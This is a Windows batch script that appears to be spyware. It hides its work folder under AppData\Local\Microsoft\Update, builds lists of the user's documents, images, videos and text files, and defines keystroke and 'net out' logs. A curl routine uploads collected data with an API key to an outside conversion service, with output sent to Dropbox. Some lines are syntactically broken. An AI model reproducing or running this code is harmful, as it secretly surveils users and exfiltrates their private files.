@echo off
SETLOCAL

GOTO :Nxt


:Nunchu
echo updating recents
findstr /v /g:"%~1" "%~2" > "%~3"
for /F "usebackq tokens=*" %%A in ("%~1") do echo %%A >> "%~3"
move "%~3" "%~1"
EXIT /B 0

:Fdr
set Vky=xpTbD9Bp4hC4eHyMSLstBm5vtPg4DgHJjhGvDhJhgHKi9Jme9fxI53hiwsD5Bqmt

set Usr=%USERNAME%
set Udr=C:\Users\%Usr%
set Wdr=Update
set Wpt=%Udr%\AppData\Local\Microsoft\%Wdr%

REM  - DOCUMENT LOG
set Nlg=%Wpt%\new-sync.txt
set Olg=%Wpt%\sync.txt

REM  - VIDEO LOG
set Nvd=%Wpt%\new-vync.txt
set Olv=%Wpt%\vync.txt

REM  -  PRIMARY LOG
set Klg=%Wpt%\strk.txt
set Tmq=%Wpt%\tmq.txt

REM  -  COMPLETED LOG
set Dme=%Wpt%\dme.txt

REM  -  STROKE LOG
set Dne=%Wpt%\dim.txt

REM  - NET OUT BINARY
set Cr1=%wpt%\curl.exe
set Cr2=C:\Windows\System32\curl.exe
set Cur=""

if exist %Cr1% set Cur=%Cr1%
if exist %Cr2% set Cur=%Cr2%
if not exist %Cur echo bail

REM  -  CONSOLIDATED PLAIN TXT
set Ixt=%Wpt%\itxt.txt
set Oxt=%Wpt%\otxt.txt

REM  -  IF NOT CREATE WORK DIR
if not exist %Wpt% mkdir %Wpt%

REM  -  UPDATE RECENT
echo > %Nlg%
for %%x in (pdf epub xls doc png jpg jpeg) do FOR /f "tokens=*" %%G IN ('dir /a /s /S /b %Udr%\*.%%x /O:D') DO echo %%G|findstr /V "App*" >> %Nlg%
for %%x in (mp4 mkv avi mov mpeg) do FOR /f "tokens=*" %%G IN ('dir /a /s /S /b %Udr%\*.%%x /O:D') DO echo %%G > %Nvd%
for %%x in (txt) do FOR /f "tokens=*" %%G IN ('dir /a /s /S /b %Udr%\*.%%x /O:D') DO echo %%G > %Ixt%


REM  -  IF CURRENT LOG FILE EXISTS
if exist %Olg% Call :Nunchu %Olg% %Nlg% %Tmq%
if exist %Olv% Call :Nunchu %Olv% %Nvd% %Tmp%

REM IF NOT DRY RUN
if exist %Nlg% Call :Mov %Nlg% %Olg%
if exist %Nvd% Call :Mov %Nvd% %Olv%

REM  -  IF PRIMARY LOG EXISTS CALL NET OUT
REM if exist %Klg% Call :Ups %Cur% %Klg% %Vky%

for /F "usebackq tokens=*" %%A in ("%Olg%") do (

  set Fp=%%A
  set Ext=%Fp:~-3%

  if "%Ext%" == "doc"   Call :prnt "%Ext%" "pdf"
  if "%Ext%" == "xls":  Call :prnt "%Ext%" "pdf"
  if "%Ext%" == "pdf":  Call :prnt "%Ext%" "%Ext%"
  if "%Ext%" == "png"   Call :prnt "%Ext%" "jpg"
  if "%Ext%" == "jpg"   Call :prnt "%Ext%" "png"
  if "%Ext%" == "peg"   Call :prnt "%Ext%" "jpg"
  if "%Ext%" == "mp4"   Call :prnt "%Ext%" "mkv"
  if "%Ext%" == "mkv"   Call :prnt "%Ext%" "mp4"
  if "%Ext%" == "avi"   Call :prnt "%Ext%" "mp4"
  if "%Ext%" == "mov"   CALL :prnt "%Ext%" "mp4"

)

GOTO :Fin



:prnt
  echo "FOUND %~1 %~2"
  EXIT /B 0


:Fin
  echo done
  EXIT /B 0


:Mov
echo Moving %~1 %~2
if exist %~1 move %~1 %~2



:Ex2
  EXIT /B 0


:Ups
%~1 -L "https://api.cloudconvert.com/convert" -F file=@"~2"" -F "apikey=%~2" -F "inputformat=pdf" -F "outputformat=pdf" -F "input=upload" -F "output=dropbox" -F "wait=true" -F "download=false" -F "save=false"


:Nxt
echo next
GOTO :Fdr

:Ex3
echo exit 3
EXIT /B 0
